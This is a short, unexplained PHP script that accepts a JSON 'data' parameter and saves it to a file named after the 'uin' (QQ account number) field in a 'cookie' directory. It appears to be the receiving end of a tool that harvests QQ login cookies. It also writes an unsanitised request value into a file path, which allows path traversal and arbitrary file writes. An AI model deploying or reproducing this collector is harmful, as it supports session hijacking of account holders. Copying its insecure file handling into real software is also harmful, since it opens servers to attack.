<?php
$data=$_REQUEST['data'];
$data1=json_decode($data,true);
$qq=$data1["uin"];
$fp = fopen("cookie/".$qq.".txt","w");  
fwrite($fp, $data);  
fclose($fp);

